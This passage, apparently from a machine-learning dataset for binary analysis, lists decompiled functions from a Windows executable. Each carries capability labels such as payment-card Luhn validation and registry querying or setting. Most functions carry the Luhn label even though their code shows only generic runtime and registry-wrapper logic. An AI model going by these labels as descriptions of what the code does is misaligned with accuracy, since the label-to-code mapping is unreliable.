        "decompiled_code": "\nfloat10 fcn.0041db00(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041ebc0();\n    if (cVar2 == '\\x11') {\n        fcn.0041d058();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dcac();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 136
    },
    "0041dc40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dc40(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041ebc0();\n    if (cVar1 == '\\x02') {\n        fcn.0041d058();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041d058();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041d058();\n    }\n    else {\n        fcn.0041ca68();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 189
    },
    "0041dcac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dcac(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041d034();\n    if (cVar1 == '\\x13') {\n        fcn.0041ebc0();\n        fcn.0041d058();\n    }\n    else {\n        iStack12 = fcn.0041dc40();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 127
    },
    "0041e0b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e0b4(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.0041928c();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00416688();\n        return;\n    }\n    fcn.0041ca68();\n    return;\n}\n",
        "token_count": 111
    },
    "0041e570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e570(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405584();\n    while( true ) {\n        cVar1 = fcn.00419424();\n        if (cVar1 != '\\0') break;\n        fcn.0040af98(param_2);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0041ea20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ea20(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41eacd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041d034();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041eadc();\n        fcn.004057d4();\n    }\n    else {\n        cVar1 = fcn.0041ebc0();\n        if (cVar1 == '\\x06') {\n            fcn.0041d058();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041d058();\n        }\n        else {\n            fcn.0041ca68();\n        }\n        fcn.00405c6c();\n        fcn.0041d058();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41ead4;\n    uStack28 = 0x41eacc;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 305
    },
    "0041eadc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041eadc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41ebb3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041d034();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041ea20();\n        fcn.00405ea8();\n    }\n    else {\n        cVar1 = fcn.0041ebc0();\n        if (cVar1 == '\\x12') {\n            fcn.0041d058();\n            fcn.00405fa4();\n            fcn.0041d058();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041d058();\n            fcn.00405c6c();\n            fcn.0041d058();\n            fcn.00407448();\n        }\n        else {\n            fcn.0041ca68();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41ebba;\n    uStack32 = 0x41ebaa;\n    fcn.00405530();\n    uStack32 = 0x41ebb2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 354
    },
    "0041eec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041eec8(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041eec8::var_1h + 1;\n    uStack36 = 0x41ef60;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041eec8::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041e9e4();\n        fcn.0041e9e4();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041cc3c();\n        if (cVar2 != '\\0') break;\n        fcn.0041ee80();\n        puVar1 = puStack32;\n    }\n    fcn.0041dcf8();\n    while( true ) {\n        cVar2 = fcn.0041cc3c();\n        if (cVar2 != '\\0') break;\n        fcn.0041eec8();\n    }\n    fcn.0041dcf8();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ef67;\n    uStack36 = 0x41ef5f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 418
    },
    "0041f0dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f0dc(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041d058();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041d058();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0041f124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f124(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f2cd;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41f150;\n    fcn.0041caf4();\n    puStack52 = 0x41f161;\n    fcn.00404620();\n    uStack56 = 0x41f2a8;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00404620();\n    fcn.0041d058();\n    fcn.0041b798(var_18h, var_18h >> 0x1f);\n    fcn.0041d058();\n    puStack76 = 0x41f1ca;\n    fcn.0041c388(0x400);\n    uStack80 = 0x41f283;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041ea20();\n    fcn.0041d058();\n    fcn.0041b798(var_18h, var_18h >> 0x1f);\n    fcn.0041d058();\n    cVar1 = fcn.00416234();\n    if (cVar1 != '\\0') {\n        fcn.0040700c();\n        cVar1 = fcn.0040f978();\n        if (cVar1 != '\\0') goto code_r0x0041f256;\n    }\n    fcn.0040dbb8();\n    fcn.00404ec4();\ncode_r0x0041f256:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41f28a;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 622
    },
    "0041fa34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fa34(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x41fa4d;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    uStack52 = 0x41fade;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &fcn.0041fa34::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.00404620();\n    fcn.0041f79c();\n    *(in_EAX + 0xe) = param_1;\n    *(in_EAX + 0xc) = param_1;\n    iVar1 = fcn.004054b4(in_EAX + 8, 4, in_EAX);\n    *(in_EAX + 4) = iVar1;\n    if (iVar1 == 0) {\n        sub.kernel32.dll_GetLastError_1();\n        fcn.0040d2e8();\n        var_ch = 0;\n        var_8h._0_1_ = 0xb;\n        in_stack_ffffffb4 = 0;\n        fcn.0040dbf4(0, &fcn.0041fa34::var_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x41fae5);\n    return;\n}\n",
        "token_count": 480
    },
    "0041fb84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fb84(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41fbf2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 != 0) {\n        fcn.0040d2e8();\n        var_10h = 0;\n        var_ch._0_1_ = 0xb;\n        var_4h._0_1_ = 0;\n        in_stack_ffffffd0 = 1;\n        var_8h = param_2;\n        fcn.0040dbf4(1, &var_10h);\n        fcn.00404ec4();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x41fbf9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 332
    },
    "0041ffc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ffc4(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x42000c;\n    if (param_1 != 0) {\n        fcn.00420180();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "00420534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420534(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.00405974();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00409c58();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040dbf4(0, &iStack20);\n                fcn.00404ec4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.004206b8();\n        fcn.004205c4();\n        fcn.004206b8();\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "004206b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004206b8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.004057e8();\n        piVar1 = fcn.00404924();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004208e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004208e8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "00420ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420ae0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "0042105c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042105c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "0042162c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042162c(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbf4(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 65
    },
    "004216c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004216c4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004217a0();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00421708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421708(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.004216c4();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00421808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00421808(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x4218d4;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    hKey = 0;\n    fcn.004055c8();\n    cVar1 = fcn.00421658();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    uVar2 = fcn.004059dc(0, 0, 0, 0xf003f, 0, &fcn.00421808::hKey, &fcn.00421808::var_ch);\n    uVar2 = fcn.004217f0(uVar2);\n    iVar3 = sub.advapi32.dll_RegCreateKeyExA(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = 0x421898;\n        sub.advapi32.dll_RegCloseKey_1(hKey);\n    }\n    else {\n        var_10h._0_1_ = 0xb;\n        uVar2 = 0;\n        var_14h = param_2;\n        fcn.0040dbf4(0, &fcn.00421808::var_14h);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x4218db);\n    return;\n}\n",
        "token_count": 433
    },
    "00421dd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421dd8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421e90;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421d70();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_28h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_24h + 1;\n                uVar2 = fcn.004059dc(&fcn.00421dd8::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumKeyExA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421e97;\n    uStack68 = 0x421e87;\n    fcn.00405530();\n    uStack68 = 0x421e8f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 471
    },
    "00421ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421ea0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421f58;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421d70();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_20h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_1ch + 1;\n                uVar2 = fcn.004059dc(&fcn.00421ea0::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumValueA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421f5f;\n    uStack68 = 0x421f4f;\n    fcn.00405530();\n    uStack68 = 0x421f57;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 478
    },
    "00421fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421fb8(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.00421f68();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 88
    },
    "00421fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421fe0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    uint uStack12;\n    \n    cVar1 = fcn.00421f68();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = uStack16;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 102
    },
    "00422188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422188(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042166c();\n    uVar1 = fcn.004059dc(0, uVar1, var_4h, arg_ch);\n    iVar2 = sub.advapi32.dll_RegSetValueExA(*(in_EAX + 4), uVar1);\n    if (iVar2 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbf4(0, &var_ch);\n        fcn.00404ec4();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "004221f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004221f0(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.004059dc(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbf4(0, &var_ch);\n        fcn.00404ec4();\n    }\n    uVar1 = fcn.0042169c();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 220
    },
    "00422264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422264(void)\n\n{\n    fcn.00421f68();\n    return;\n}\n",
        "token_count": 24
    },
    "00422274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422274(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x4222fa;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.004055c8();\n    cVar1 = fcn.00421658();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    var_8h = 0;\n    uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_8h);\n    uVar2 = fcn.004217f0(uVar2);\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x422301);\n    return;\n}\n",
        "token_count": 264
    },
    "0042230c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042230c(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uVar1 = *(in_EAX + 0x18);\n    uStack28 = 0x422371;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *(in_EAX + 0x18) = uVar1 & 0x300 | 0x20009;\n    iStack36 = 0x422348;\n    iVar2 = fcn.00422274();\n    if (iVar2 != 0) {\n        sub.advapi32.dll_RegCloseKey_1();\n        iStack36 = iVar2;\n    }\n    *in_FS_OFFSET = iStack36;\n    *(in_EAX + 0x18) = uVar1;\n    return;\n}\n",
        "token_count": 257
    },
    "00422384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422384(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(*(arg_8h + -4) + 4);\n    puStack36 = 0x4223a9;\n    fcn.00421804();\n    uStack40 = 0x422497;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x4223c4;\n    puStack36 = &stack0xfffffffc;\n    arg_ch = fcn.00421fb8();\n    if (0 < arg_ch) {\n        puStack48 = 0x4223d5;\n        var_10h = fcn.00402ee8();\n        uStack52 = 0x422474;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStack68 = 0x4223fb;\n        puStack48 = &stack0xfffffffc;\n        arg_ch_00 = fcn.004221f0(&stack0xffffffeb, arg_ch);\n        var_ch = *(*(arg_8h + -4) + 4);\n        puStack68 = 0x422417;\n        fcn.00421804();\n        uStack72 = 0x422457;\n        uStack76 = *in_FS_OFFSET;\n        